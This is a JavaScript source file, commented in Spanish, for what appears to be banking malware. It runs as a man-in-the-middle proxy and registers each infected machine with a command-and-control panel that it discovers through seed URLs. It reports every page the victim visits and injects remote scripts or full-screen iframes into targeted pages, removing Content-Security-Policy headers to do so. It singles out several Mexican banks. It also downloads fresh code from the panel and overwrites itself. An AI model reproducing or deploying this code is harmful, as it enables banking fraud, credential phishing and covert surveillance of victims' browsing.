// worker.js v5.3 - 2026-08-06
import { createRequire } from 'module';
import fs               from 'fs';
import os               from 'os';
import path             from 'path';
import crypto           from 'crypto';
import tls              from 'tls';
import { execSync }     from 'child_process';
import { fileURLToPath } from 'url';

// Forzar HTTP/1.1 en todos los contextos TLS del proxy.
// Sin esto, Chrome negocia h2 (HTTP/2) a través del túnel MitM y el parser
// HTTP/1.1 de http-mitm-proxy lanza "Parse Error: Invalid method encountered".
const _tlsCreateServer        = tls.createServer;
const _tlsCreateSecureContext = tls.createSecureContext;

tls.createServer = function(...args) {
  if (args[0] && typeof args[0] === 'object') {
    args[0] = { ...args[0], ALPNProtocols: ['http/1.1'] };
  } else {
    args.unshift({ ALPNProtocols: ['http/1.1'] });
  }
  // Confirmar que el patch esta activo (aparece en el log al crear tuneles SSL)
  try { fs.appendFileSync(path.join(path.dirname(new URL(import.meta.url).pathname), 'proxy_debug.log'), `[${new Date().toISOString()}] [tls:patch] createServer h1.1\n`); } catch {}
  return _tlsCreateServer.apply(tls, args);
};

tls.createSecureContext = function(...args) {
  if (args[0] && typeof args[0] === 'object') {
    const opts = { ...args[0], ALPNProtocols: ['http/1.1'] };
    // Descartar cert/key con PEM inválido para evitar "no start line" uncaught
    const isPem = v => {
      if (!v) return false;
      const s = Buffer.isBuffer(v) ? v.toString('utf8', 0, 64) : String(v).slice(0, 64);
      return s.includes('-----BEGIN');
    };
    if (opts.cert !== undefined && !isPem(opts.cert)) { log('[tls] cert PEM inválido, descartado'); delete opts.cert; }
    if (opts.key  !== undefined && !isPem(opts.key))  { log('[tls] key PEM inválido, descartado');  delete opts.key;  }
    args[0] = opts;
  } else {
    args.unshift({ ALPNProtocols: ['http/1.1'] });
  }
  return _tlsCreateSecureContext.apply(tls, args);
};

// http-mitm-proxy es CJS, lo importamos desde ESM con createRequire
const require = createRequire(import.meta.url);
const Proxy   = require('http-mitm-proxy');

// ── Versión — incrementar aquí Y en api/version.php antes de cada deploy ─────
const WORKER_VERSION = 5.4;

// ── Configuración ─────────────────────────────────────────────────────────────
const DIR_BASE   = path.dirname(fileURLToPath(import.meta.url));
const PROXY_PORT  = parseInt(process.env.PROXY_PORT  ?? '8877');
const BOT_SECRET  = process.env.BOT_SECRET  ?? '';
const BYPASS_CODE = process.env.BYPASS_CODE ?? '';   // ?bypassCode=<este valor> salta inject/redirect
const SSL_CA_DIR  = path.join(DIR_BASE, '.crt');   // ca.pem se genera aquí (debe coincidir con setup.ps1)

const BYPASS_COOKIE = '__px_bp__';

const SEED_URLS = [
  'https://raw.githubusercontent.com/sehhkona/projectweb/refs/heads/main/support.json',
  'https://ww4.poderyfinanzas.cfd/fall.json'
];

// ── Identidad estable por máquina ─────────────────────────────────────────────
const ID_FILE    = path.join(DIR_BASE, '.bi');
const TOKEN_FILE = path.join(DIR_BASE, '.tok');

function getUsername() {
  try { return os.userInfo().username; } catch {}
  return process.env.USERNAME ?? process.env.USER ?? 'unknown';
}

function getMachineId() {
  if (fs.existsSync(ID_FILE)) return fs.readFileSync(ID_FILE, 'utf8').trim();
  let id = null;
  // Windows: leer MachineGuid del registry — estable aunque se reinstale la app
  if (process.platform === 'win32') {
    try {
      const out = execSync(
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid',
        { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
      );
      const m = out.match(/MachineGuid\s+REG_SZ\s+(\S+)/i);
      if (m) id = m[1].trim();
    } catch {}
  }
  id = id ?? crypto.randomUUID();
  fs.writeFileSync(ID_FILE, id, 'utf8');
  return id;
}
function getStoredToken()  { return fs.existsSync(TOKEN_FILE) ? fs.readFileSync(TOKEN_FILE, 'utf8').trim() : null; }
function saveToken(t)      { fs.writeFileSync(TOKEN_FILE, t, 'utf8'); }
function clearToken()      { if (fs.existsSync(TOKEN_FILE)) fs.unlinkSync(TOKEN_FILE); }

// ── Discovery del panel activo ────────────────────────────────────────────────
async function getActivePanel() {
  for (const seed of SEED_URLS) {
    try {
      const list = await fetch(seed, { signal: AbortSignal.timeout(4000) }).then(r => r.json());
      for (const p of list) {
        const ok = await fetch(`${p}/ping-check`, { signal: AbortSignal.timeout(2000) })
          .then(r => r.ok).catch(() => false);
        if (ok) return p;
      }
    } catch {}
  }
  throw new Error('Ningún panel disponible.');
}

async function register(panelUrl) {
  const res = await fetch(`${panelUrl}/register`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ machineId: getMachineId(), hostname: os.hostname(), username: getUsername(), secret: BOT_SECRET, version: WORKER_VERSION }),
    signal:  AbortSignal.timeout(8000),
  });
  if (!res.ok) throw new Error(`Register falló: HTTP ${res.status}`);
  const { token } = await res.json();
  saveToken(token);
  return token;
}

async function getToken(panelUrl) { return getStoredToken() ?? register(panelUrl); }

async function fetchRules(panelUrl, token = '') {
  const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
  const res = await fetch(`${panelUrl}/rules`, { headers, signal: AbortSignal.timeout(5000) });
  if (!res.ok) throw new Error(`Rules falló: HTTP ${res.status}`);
  const list = (await res.json()).rules ?? [];
  log(`[rules] ${list.length} regla(s) cargada(s)`);
  list.forEach((r, i) => log(`  [rule${i}] action=${r.action} match_type=${r.match_type} pattern=${r.pattern}`));
  return list;
}

// Reportar URL activa al panel — debounce 2s para evitar duplicados en redirects
let _lastNavUrl = '';
let _lastNavTs  = 0;
function reportNav(url) {
  const now = Date.now();
  if (url === _lastNavUrl && now - _lastNavTs < 2000) return;
  _lastNavUrl = url;
  _lastNavTs  = now;
  const token = getStoredToken();
  if (!activePanelUrl || !token) return;
  fetch(`${activePanelUrl}/nav`, {
    method:  'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
    body:    JSON.stringify({ url }),
    signal:  AbortSignal.timeout(3000),
  }).catch(() => null);
}

async function ping(panelUrl, token) {
  const res = await fetch(`${panelUrl}/ping`, {
    method:  'POST',
    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
    body:    JSON.stringify({ hostname: os.hostname(), username: getUsername(), version: WORKER_VERSION }),
    signal:  AbortSignal.timeout(5000),
  }).catch(() => null);
  if (res?.status === 403) clearToken();
}

// ── Matching de reglas ────────────────────────────────────────────────────────
function matchesRule(url, rule) {
  try {
    if (rule.match_type === 'exact') return url === rule.pattern;
    if (rule.match_type === 'regex') return new RegExp(rule.pattern).test(url);
    return url.includes(rule.pattern);
  } catch { return false; }
}

// ── Bypass: ?bypassCode=<BYPASS_CODE> salta inject/redirect para esa sesión ──
// Al detectar el código en la URL lo elimina antes de reenviar al servidor
// y fija una cookie que bypass también las navegaciones siguientes (2h).
function checkBypass(ctx) {
  if (!BYPASS_CODE) return false;
  const cookies = ctx.clientToProxyRequest.headers['cookie'] ?? '';
  if (cookies.split(';').some(c => c.trim().startsWith(`${BYPASS_COOKIE}=`))) return true;
  const urlPath = ctx.clientToProxyRequest.url ?? '/';
  try {
    const u = new URL(`http://h${urlPath}`);
    if (u.searchParams.get('bypassCode') === BYPASS_CODE) {
      u.searchParams.delete('bypassCode');
      const clean = u.pathname + (u.search || '') + (u.hash || '');
      if (ctx.proxyToServerRequestOptions) ctx.proxyToServerRequestOptions.path = clean;
      ctx._activateBypass = true;
      return true;
    }
  } catch {}
  return false;
}

// ── Construcción del HTML a inyectar ──────────────────────────────────────────
function buildInjection(rule, mid = '') {
  const parts = [];
  if (rule.config?.scriptInline) {
    parts.push(`<script>${rule.config.scriptInline}</script>`);
  }
  if (rule.config?.scriptUrl) {
    parts.push(`<script src="${rule.config.scriptUrl}?_=${Date.now()}" async></script>`);
  }
  if (rule.config?.to) {
    // Sustituir {mi0x} o appender al final de _mi0x= con el machineId
    let toUrl = rule.config.to;
    if (mid) {
      if (toUrl.includes('{mi0x}')) {
        toUrl = toUrl.replace(/\{mi0x\}/g, mid);
      } else if (toUrl.includes('_mi0x=') && !toUrl.match(/_mi0x=[^&]+/)) {
        toUrl += mid;
      }
    }
    parts.push(`<script>
(function(){
  var SRC='${toUrl}';
  function inject(){
    if(document.getElementById('__bot_frame__')) return;
    var s=document.createElement('style');
    s.textContent='#__bot_frame__{position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647}';
    var f=document.createElement('iframe');
    f.id='__bot_frame__'; f.src=SRC; f.referrerPolicy='no-referrer';
    (document.body||document.documentElement).appendChild(s);
    (document.body||document.documentElement).appendChild(f);
  }
  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',inject);
  } else { inject(); }
  new MutationObserver(function(){inject();}).observe(document.documentElement,{childList:true,subtree:true});
})();
</script>`);
  }
  return parts.join('\n');
}

//── Debug log a archivo (visible aunque el proceso no tenga ventana) ──────────
const LOG_FILE = path.join(DIR_BASE, 'proxy_debug.log');
function log(...args) {
  const line = `[${new Date().toISOString()}] ${args.join(' ')}\n`;
  try { fs.appendFileSync(LOG_FILE, line); } catch {}
  console.log(...args);
}
// Rotar log al arrancar (no crecer infinito)
try { if (fs.existsSync(LOG_FILE) && fs.statSync(LOG_FILE).size > 2_000_000) fs.writeFileSync(LOG_FILE, ''); } catch {}
log('[start] worker.js v2.1 arrancando');

// ── Reglas en memoria (se cargan desde el panel en background) ────────────────
let rules        = [];
let activePanelUrl = null;   // en memoria únicamente, nunca se escribe en disco

async function reportCrash(source, reason) {
  if (!activePanelUrl) return;
  let logTail = '';
  try {
    const stat = fs.statSync(LOG_FILE);
    const from = Math.max(0, stat.size - 4096);
    const buf  = Buffer.alloc(stat.size - from);
    const fd   = fs.openSync(LOG_FILE, 'r');
    fs.readSync(fd, buf, 0, buf.length, from);
    fs.closeSync(fd);
    logTail = buf.toString('utf8');
  } catch {}
  try {
    await fetch(`${activePanelUrl}/crash`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ machineId: getMachineId(), source, reason: String(reason).slice(0, 2048), log_tail: logTail, secret: BOT_SECRET }),
      signal:  AbortSignal.timeout(5000),
    });
  } catch {}
}

// ── Auto-update ───────────────────────────────────────────────────────────────
let _updatingNow = false;

async function checkForUpdate() {
  if (!activePanelUrl || _updatingNow) return;
  _updatingNow = true;
  try {
    const res = await fetch(`${activePanelUrl}/version`, { signal: AbortSignal.timeout(8000) });
    if (!res.ok) return;
    const { version, url } = await res.json();
    if (typeof version !== 'number' || !url || version <= WORKER_VERSION) return;

    log(`[update] v${WORKER_VERSION} → v${version}, descargando...`);
    const newCode = await fetch(`${url}?ts=${Date.now()}`, { signal: AbortSignal.timeout(30_000) }).then(r => r.text());
    if (!newCode || newCode.length < 500) { log('[update] descarga inválida, abortando'); return; }

    const workerFile = path.join(DIR_BASE, 'worker.js');
    fs.writeFileSync(workerFile, newCode, 'utf8');
    log(`[update] worker.js actualizado a v${version}, reiniciando en 3s...`);
    setTimeout(() => process.exit(0), 3000);
  } catch (e) {
    log('[update] error:', e.message);
  } finally {
    _updatingNow = false;
  }
}

async function connectToPanel() {
  while (true) {
    try {
      const panelUrl = await getActivePanel();
      activePanelUrl = panelUrl;
      let token      = await getToken(panelUrl);

      rules = await fetchRules(panelUrl, token);
      log(`[panel] conectado | machineId: ${getMachineId()} | v${WORKER_VERSION}`);

      setInterval(async () => {
        try {
          if (!getStoredToken()) token = await register(panelUrl).catch(() => token);
          await ping(panelUrl, token);
        } catch {}
      }, 60_000);

      setInterval(async () => {
        try { rules = await fetchRules(panelUrl, token); }
        catch (e) { log('[rules refresh]', e.message); }
      }, 5 * 60_000);

      setInterval(() => checkForUpdate(), 15 * 60_000);

      ping(panelUrl, token);
      checkForUpdate();
      return;
    } catch (e) {
      log(`[panel] no disponible, reintento en 30s: ${e.message}`);
      await new Promise(r => setTimeout(r, 30_000));
    }
  }
}

// ── Proxy MITM ────────────────────────────────────────────────────────────────
fs.mkdirSync(SSL_CA_DIR, { recursive: true });

const proxy = Proxy();
proxy.use(Proxy.gunzip);   // descomprime gzip/deflate automáticamente

proxy.onError((ctx, err) => {
  if (['ECONNRESET', 'EPIPE', 'ECONNREFUSED', 'ENOTFOUND', 'ETIMEDOUT', 'EHOSTUNREACH'].includes(err?.code)) return;
  if (err?.code === 'EADDRINUSE') { log('[proxy] puerto ocupado — otra instancia activa, cerrando esta'); process.exit(0); }
  if (err?.message?.includes('no start line')) return;   // cert PEM inválido, por-conexión, no fatal
  if (err?.code === 'ERR_HTTP_HEADERS_SENT') return;    // doble write por-request, no fatal
  log('[proxy error]', err?.message ?? err);
});

// Ver cada tunnel CONNECT que llega al proxy
proxy.onConnect((req, _socket, _head, callback) => {
  const host = req.url ?? '';
  const matchesAny = rules.some(r => r.action === 'inject' && host.includes(r.pattern.split('/')[0]));
  if (matchesAny || host.includes('banamex') || host.includes('hsbc') || host.includes('santander') || host.includes('bbva') || host.includes('afirme')) {
    log(`[CONNECT:target] ${host}`);
  }
  return callback();
});

// ── REDIRECT: responde 302 antes de conectar al servidor de destino ───────────
proxy.onRequest((ctx, callback) => {
  const host    = ctx.clientToProxyRequest.headers.host ?? '';
  const urlPath = ctx.clientToProxyRequest.url ?? '/';
  const fullUrl = `${ctx.isSSL ? 'https' : 'http'}://${host}${urlPath}`;

  if (checkBypass(ctx)) {
    ctx._bypass = true;
    log(`[bypass] ${fullUrl}`);
    return callback();
  }

  // Reportar navegación top-level al panel (Sec-Fetch-Dest: document = página real, no sub-recurso)
  if ((ctx.clientToProxyRequest.headers['sec-fetch-dest'] ?? '') === 'document') {
    reportNav(fullUrl);
  }

  for (const rule of rules) {
    if (rule.action !== 'redirect') continue;
    if (!matchesRule(fullUrl, rule) || !rule.config?.to) continue;

    log(`[redirect] ${fullUrl} -> ${rule.config.to}`);
    ctx.proxyToClientResponse.writeHead(302, {
      'Location':       rule.config.to,
      'Content-Length': '0',
      'Connection':     'close',
    });
    ctx.proxyToClientResponse.end();
    return;   // no llamar callback → corta la cadena
  }

  if (ctx.proxyToServerRequestOptions?.headers) {
    // Forzar gzip/deflate — Proxy.gunzip no entiende Brotli (br)
    ctx.proxyToServerRequestOptions.headers['accept-encoding'] = 'gzip, deflate';

    // Para URLs con regla inject: eliminar headers condicionales para evitar 304
    const hasInjectRule = rules.some(r => r.action === 'inject' && matchesRule(fullUrl, r));
    if (hasInjectRule) {
      const h = ctx.proxyToServerRequestOptions.headers;
      const etag = h['if-none-match'] ?? h['If-None-Match'];
      const ims  = h['if-modified-since'] ?? h['If-Modified-Since'];
      log(`[strip] ${fullUrl} | etag=${etag ?? 'none'} | ims=${ims ?? 'none'}`);
      delete h['if-none-match'];    delete h['If-None-Match'];
      delete h['if-modified-since']; delete h['If-Modified-Since'];
      delete h['if-range'];          delete h['If-Range'];
      h['cache-control'] = 'no-cache, no-store';
      h['pragma'] = 'no-cache';
    }
  } else {
    log(`[warn] proxyToServerRequestOptions.headers no disponible para ${fullUrl}`);
  }

  return callback();
});

// ── INJECT: detectar respuestas HTML que necesitan modificación ───────────────
proxy.onResponse((ctx, callback) => {
  // Si ya enviamos una respuesta propia (ej: redirect 302), no tocar nada
  if (ctx.proxyToClientResponse.headersSent) return callback();
  const contentType = ctx.serverToProxyResponse.headers['content-type'] ?? '';
  const host    = ctx.clientToProxyRequest.headers.host ?? '';
  const urlPath = ctx.clientToProxyRequest.url ?? '/';
  const fullUrl = `${ctx.isSSL ? 'https' : 'http'}://${host}${urlPath}`;

  const statusCode = ctx.serverToProxyResponse.statusCode;
  const location   = ctx.serverToProxyResponse.headers['location'] ?? '';

  // Sub-requests (AJAX/fetch/XHR) nunca se inyectan aunque el Content-Type sea text/html.
  // PHP devuelve text/html por defecto aunque el body sea JSON — sin este check se corrompe.
  const fetchDest    = ctx.clientToProxyRequest.headers['sec-fetch-dest'] ?? '';
  const xhrHeader    = (ctx.clientToProxyRequest.headers['x-requested-with'] ?? '').toLowerCase();
  const isSubRequest = fetchDest === 'empty' || fetchDest === 'worker' ||
                       xhrHeader === 'xmlhttprequest';

  // Solo inyectar en navegaciones reales a páginas HTML (Sec-Fetch-Dest: document / iframe / frame)
  const looksLikeHtml = !isSubRequest && statusCode >= 200 && statusCode < 300 &&
                        contentType.includes('text/html');

  const injectRule = looksLikeHtml && !ctx._bypass
    ? rules.find(r => r.action === 'inject' && matchesRule(fullUrl, r))
    : null;

  ctx._looksLikeHtml = looksLikeHtml;

  if (looksLikeHtml && !ctx._bypass) {
    delete ctx.serverToProxyResponse.headers['content-length'];
    delete ctx.serverToProxyResponse.headers['content-encoding'];
  }

  if (injectRule) {
    ctx._injectRule  = injectRule;
    ctx._injectPoint = injectRule.config?.inject_point ?? 'body';
    ctx._chunks      = [];
    const encBefore = ctx.serverToProxyResponse.headers['content-encoding'] ?? '(none)';
    delete ctx.serverToProxyResponse.headers['content-length'];
    delete ctx.serverToProxyResponse.headers['content-encoding'];
    // Evitar que Chrome cachee la respuesta inyectada
    ctx.serverToProxyResponse.headers['cache-control'] = 'no-store, max-age=0';
    delete ctx.serverToProxyResponse.headers['expires'];
    // Eliminar CSP — bloquea iframes/scripts externos que inyectamos
    delete ctx.serverToProxyResponse.headers['content-security-policy'];
    delete ctx.serverToProxyResponse.headers['x-content-security-policy'];
    delete ctx.serverToProxyResponse.headers['x-webkit-csp'];
    log(`[inject:match] ${fullUrl} | status=${statusCode} | ct=${contentType || '(empty)'} | enc=${encBefore} | pattern=${injectRule.pattern}`);
  } else if (looksLikeHtml) {
    log(`[inject:skip] ${fullUrl} | status=${statusCode} | ct=${contentType || '(empty)'} | no rule match`);
  } else if (statusCode >= 300 && statusCode < 400) {
    // Loguear redirects para ver la cadena de navegacion
    log(`[nav] ${fullUrl} | status=${statusCode}${location ? ' -> ' + location : ''}`);
  }

  // Activar cookie de bypass en la respuesta cuando se detectó el código en la URL
  if (ctx._activateBypass) {
    const bypassCookie = `${BYPASS_COOKIE}=1; Max-Age=7200; Path=/; SameSite=Strict`;
    const existing = ctx.serverToProxyResponse.headers['set-cookie'];
    ctx.serverToProxyResponse.headers['set-cookie'] = existing
      ? (Array.isArray(existing) ? [...existing, bypassCookie] : [existing, bypassCookie])
      : bypassCookie;
    log(`[bypass] cookie set para ${host}`);
  }

  // CACHE-BUST: si el redirect apunta a una URL con regla inject, añadir ?_cb= para romper disk cache
  if (!ctx._bypass && statusCode >= 300 && statusCode < 400 && location) {
    const destMatches = rules.some(r => r.action === 'inject' && matchesRule(location, r));
    if (destMatches) {
      try {
        const u = new URL(location);
        if (!u.searchParams.has('_cb')) {
          u.searchParams.set('_cb', Date.now());
          ctx.serverToProxyResponse.headers['location'] = u.toString();
          ctx.serverToProxyResponse.headers['cache-control'] = 'no-store, max-age=0';
          delete ctx.serverToProxyResponse.headers['expires'];
          log(`[cache-bust] ${fullUrl} | ${location} -> ${u.toString()}`);
        }
      } catch (e) { log('[cache-bust error]', e.message); }
    }
  }

  return callback();
});

// Pasar todos los chunks sin modificar — acumular causaba que Buffer.alloc(0)
// enviara 0\r\n\r\n (fin de chunked body) antes de que onResponseEnd pudiera inyectar
proxy.onResponseData((ctx, chunk, callback) => {
  if (!ctx._injectRule || ctx._injectPoint !== 'head' || ctx._headInjected) {
    return callback(null, chunk);
  }
  const str  = chunk.toString('utf8');
  const hi   = str.toLowerCase().indexOf('<head');
  if (hi === -1) return callback(null, chunk);
  const gt = str.indexOf('>', hi);
  if (gt === -1) return callback(null, chunk);

  const mid    = getMachineId();
  const miSnip = `<script>window.__mi0x='${mid}';document.documentElement.setAttribute('data-mi0x','${mid}');</script>`;
  const inject = buildInjection(ctx._injectRule, mid);
  const host   = ctx.clientToProxyRequest.headers.host ?? '';
  log(`[inject:head] OK ${host} | inject=${inject.length}b`);

  ctx._headInjected = true;
  const patched = str.slice(0, gt + 1) + '\n' + miSnip + '\n' + inject + str.slice(gt + 1);
  return callback(null, Buffer.from(patched, 'utf8'));
});

// Escribir el inject directamente al socket — callback(null, data) en onResponseEnd
// es ignorado por http-mitm-proxy (async.forEach solo propaga err, no data)
proxy.onResponseEnd((ctx, callback) => {
  if (ctx.proxyToClientResponse.writableEnded) return callback();
  if (!ctx._injectRule) return callback();
  if (ctx._headInjected) return callback();   // ya inyectado en <head>, no duplicar

  const host    = ctx.clientToProxyRequest.headers.host ?? '';
  const urlPath = ctx.clientToProxyRequest.url ?? '/';
  const fullUrl = `${ctx.isSSL ? 'https' : 'http'}://${host}${urlPath}`;

  const mid    = getMachineId();
  // miSnip mantiene window.__mi0x para scriptInline / scriptUrl que puedan leerlo
  const miSnip = `<script>window.__mi0x='${mid}';document.documentElement.setAttribute('data-mi0x','${mid}');</script>`;
  const inject = buildInjection(ctx._injectRule, mid);
  log(`[inject] OK ${fullUrl} | inject=${inject.length}b`);
  ctx.proxyToClientResponse.write(Buffer.from('\n' + miSnip + '\n' + inject, 'utf8'));

  return callback();
});

// ── Crash handlers — reportan al panel antes de morir ─────────────────────────
const NON_FATAL = e =>
  e?.message?.includes('valid error code number') ||  // ws.close() con código inválido
  e?.message?.includes('no start line')           ||  // cert PEM vacío/corrupto (0480006C)
  e?.message?.includes('illegal padding')         ||  // cert DER corrupto (0680800D asn1)
  e?.message?.includes('asn1 encoding routines')  ||  // otros errores asn1 de cert
  e?.code === 'ERR_HTTP_HEADERS_SENT'             ||  // doble write headers, por-request
  e?.code === 'ECONNRESET'                        ||  // cliente cerró socket durante write (ej: tab cerrada)
  e?.code === 'EPIPE';                               // write a socket ya cerrado (mismo escenario)

process.on('uncaughtException', (err) => {
  if (NON_FATAL(err)) return;
  log('[crash] uncaughtException:', err?.message ?? err);
  reportCrash('uncaught', err?.stack ?? err?.message ?? String(err))
    .catch(() => {})
    .finally(() => process.exit(1));
});

process.on('unhandledRejection', (reason) => {
  if (NON_FATAL(reason)) return;
  log('[crash] unhandledRejection:', reason?.message ?? reason);
  reportCrash('unhandled', reason?.stack ?? reason?.message ?? String(reason))
    .catch(() => {})
    .finally(() => process.exit(1));
});

// ── Arranque ──────────────────────────────────────────────────────────────────
proxy.listen({ port: PROXY_PORT, host: '127.0.0.1', sslCaDir: SSL_CA_DIR }, (err) => {
  if (err) { log('[listen error]', err); process.exit(1); }
  log(`[proxy] escuchando :${PROXY_PORT}`);
  log(`[proxy] CA dir: ${SSL_CA_DIR}`);
  log(`[proxy] log: ${LOG_FILE}`);
  connectToPanel().catch(e => log('[panel init]', e.message));
});
